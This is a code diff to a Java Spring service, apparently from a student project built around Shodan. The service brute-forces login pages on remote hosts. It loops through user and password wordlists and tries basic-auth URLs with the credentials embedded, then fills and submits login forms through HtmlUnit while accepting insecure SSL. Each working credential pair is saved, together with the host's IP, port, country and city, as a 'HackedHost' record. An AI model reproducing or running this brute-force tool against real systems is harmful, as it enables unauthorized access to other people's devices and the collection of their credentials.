@@ -1,10 +1,6 @@
 package com.uah.shodan_tfg.core.services.impl;
 
-import java.io.BufferedReader;
 import java.io.IOException;
-import java.io.InputStreamReader;
-import java.io.PrintWriter;
-import java.net.Socket;
 import java.net.URI;
 import java.net.http.HttpClient;
 import java.net.http.HttpClient.Redirect;
@@ -26,10 +22,10 @@ import org.springframework.scheduling.annotation.Async;
 import org.springframework.scheduling.annotation.AsyncResult;
 import org.springframework.stereotype.Service;
 
-import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
+import com.gargoylesoftware.htmlunit.BrowserVersion;
 import com.gargoylesoftware.htmlunit.WebClient;
 import com.gargoylesoftware.htmlunit.html.HtmlButton;
-import com.gargoylesoftware.htmlunit.html.HtmlForm;
+import com.gargoylesoftware.htmlunit.html.HtmlButtonInput;
 import com.gargoylesoftware.htmlunit.html.HtmlPage;
 import com.gargoylesoftware.htmlunit.html.HtmlPasswordInput;
 import com.gargoylesoftware.htmlunit.html.HtmlSubmitInput;
@@ -117,14 +113,15 @@ public class ConnectionService implements IConnectionService {
 		Integer port = host.getPort();
 
 		if (running.compareAndSet(false, true)) {
-			final WebClient webClient = new WebClient();
+			final WebClient webClient = new WebClient(BrowserVersion.FIREFOX);
 			String protocol = "http://";
 			if (host.getPort() == 443) {
 				protocol = "https://";
 			}
 			webClient.getOptions().setUseInsecureSSL(true);
 			HtmlPage page;
-
+			System.out.println("IP --> " + ip + " | Port: " + port);
+			messageController.send("IP --> " + ip + " | Port: " + port);
 			try {
 
 				for (String user : userWordlist) {
@@ -134,50 +131,106 @@ public class ConnectionService implements IConnectionService {
 							running.set(false);
 							return new AsyncResult<String>(finalResult);
 						}
-
-						page = webClient.getPage(
-								protocol + host.getIp() + ":" + host.getPort());
-
-						final HtmlForm form = page.getForms().get(0);
-
-						final HtmlTextInput userField = (HtmlTextInput) form
-								.getByXPath(
-										"//input[contains(@name, 'user') or contains(@name, 'username') or contains(@name, 'userName') or contains(@name, 'login') or contains(@ng-model, 'user')]")
-								.get(0);
-						final HtmlPasswordInput passField = (HtmlPasswordInput) form
-								.getByXPath(
-										"//input[contains(@type, 'password')]")
-								.get(0);
-
-						System.out.println("Credentials tested --> User: "
-								+ user + " | Password: " + pass);
-						messageController.send("Credentials tested --> User: "
-								+ user + " | Password: " + pass);
-
-						userField.type(user);
-						passField.type(pass);
-
-						final HtmlSubmitInput button;
-						final HtmlButton backupButton;
-						HtmlPage page2;
+						String baseUrl = protocol + host.getIp() + ":"
+								+ host.getPort();
+						String url = protocol + user + ":" + pass + "@"
+								+ host.getIp() + ":" + host.getPort();
 						try {
-							button = (HtmlSubmitInput) form
-									.getByXPath(
-											"//*[contains(@type, 'submit')]")
-									.get(0);
-							page2 = button.click();
-						} catch (Exception ex) {
-							backupButton = (HtmlButton) form.getByXPath(
-									"//button[contains(@type, 'submit') or contains(@id, 'submit')]")
-									.get(0);
-							page2 = backupButton.click();
-						}
-						// Now submit the form by clicking the button and get
-						// back the second page.
+							System.out.println("Credentials tested --> User: "
+									+ user + " | Password: " + pass);
+							messageController
+									.send("Credentials tested --> User: " + user
+											+ " | Password: " + pass);
+							page = webClient.getPage(url);
+							if (!page.getUrl().toString().equals(baseUrl)) {
+								result = "Correct login credentials --> User: "
+										+ user + " | Password: " + pass;
+								System.out.println(result);
+								messageController.send(result);
+								finalResult = ip + "|" + user + "|" + pass + "|"
+										+ port;
+								HackedHost hackedHost = hackedHostRepository
+										.findByIpAndPort(ip, host.getPort());
+								if (hackedHost == null) {
+									hackedHost = new HackedHost(null, ip, user,
+											pass, host.getPort(),
+											host.getLocation().getCountry(),
+											host.getLocation().getCity(),
+											finalResult);
+								} else {
+									hackedHost.setUser(user);
+									hackedHost.setPassword(pass);
+								}
+								hackedHostRepository.save(hackedHost);
+								running.set(false);
+								return new AsyncResult<String>(finalResult);
+							}
+						} catch (Exception e) {
 
-						// Get new form, if exists
-						if (page2.getForms().isEmpty() || page2.getForms()
-								.get(0)
+						}
+						HtmlPage page2 = null;
+						try {
+							page = webClient.getPage(protocol + host.getIp()
+									+ ":" + host.getPort());
+
+							// final List<HtmlForm> forms = page.getForms();
+
+							// if(!forms.isEmpty()) {
+							// final HtmlForm form = page.getForms().get(0);
+							// }
+
+							final HtmlTextInput userField = (HtmlTextInput) page
+									.getByXPath(
+											"//input[contains(@name, 'user') or contains(@id, 'usr') or contains(@name, 'username') or contains(@name, 'userName') or contains(@name, 'login') or contains(@ng-model, 'user')]")
+									.get(0);
+							final HtmlPasswordInput passField = (HtmlPasswordInput) page
+									.getByXPath(
+											"//input[contains(@type, 'password')]")
+									.get(0);
+
+							System.out.println("Credentials tested --> User: "
+									+ user + " | Password: " + pass);
+							messageController
+									.send("Credentials tested --> User: " + user
+											+ " | Password: " + pass);
+
+							userField.type(user);
+							passField.type(pass);
+
+							final HtmlSubmitInput button;
+							final HtmlButton backupButton;
+							final HtmlButtonInput backupButton2;
+
+							try {
+								button = (HtmlSubmitInput) page.getByXPath(
+										"//input[contains(@type, 'submit') or contains(@name, 'Login')]")
+										.get(0);
+								page2 = button.click();
+							} catch (Exception ex) {
+								try {
+									backupButton = (HtmlButton) page.getByXPath(
+											"//button[contains(@type, 'submit') or contains(@id, 'submit') or contains(@id, 'Login')]")
+											.get(0);
+									page2 = backupButton.click();
+								} catch (Exception ex2) {
+									try {
+										backupButton2 = (HtmlButtonInput) page
+												.getByXPath(
+														"//input[contains(@type, 'button') or contains(@id, 'submit') or contains(@id, 'Login')]")
+												.get(0);
+										page2 = backupButton2.click();
+									} catch (Exception ex3) {
+										LOGGER.error(ex3.getMessage(), ex3);
+										page2 = null;
+									}
+								}
+
+							}
+						} catch (Exception e) {
+
+						}
+
+						if (page2 != null && page2
 								.getByXPath(
 										"//input[contains(@type, 'password')]")
 								.isEmpty()) {
@@ -209,8 +262,6 @@ public class ConnectionService implements IConnectionService {
 						}
 					}
 				}
-			} catch (FailingHttpStatusCodeException | IOException e) {
-				LOGGER.error(e.getMessage(), e);
 			} catch (Exception e) {
 				LOGGER.error(e.getMessage(), e);
 				messageController.send("Login attempts for IP " + ip
@@ -225,43 +276,6 @@ public class ConnectionService implements IConnectionService {
 				.send("Login attempts for IP " + ip + " were not successfull");
 		return new AsyncResult<String>(finalResult);
 
-	}
-
-	private void testSecurity(Integer id, String ip, Integer port) {
-		try {
-			Socket clientSocket = new Socket(ip, port);
-			PrintWriter out = new PrintWriter(clientSocket.getOutputStream(),
-					true);
-			BufferedReader in = new BufferedReader(
-					new InputStreamReader(clientSocket.getInputStream()));
-			sendMessage("Test 1", in, out);
-			stopConnection(in, out, clientSocket);
-		} catch (IOException e) {
-			LOGGER.error(e.getMessage(), e);
-		}
-	}
-
-	private String sendMessage(String msg, BufferedReader in, PrintWriter out) {
-		out.println(msg);
-		String resp = "";
-		try {
-			resp = in.readLine();
-			System.out.println(resp);
-		} catch (IOException e) {
-			LOGGER.error(e.getMessage(), e);
-		}
-		return resp;
-	}
-
-	private void stopConnection(BufferedReader in, PrintWriter out,
-			Socket clientSocket) {
-		try {
-			in.close();
-			out.close();
-			clientSocket.close();
-		} catch (IOException e) {
-			LOGGER.error(e.getMessage(), e);
-		}
 	}
 
 	@Override
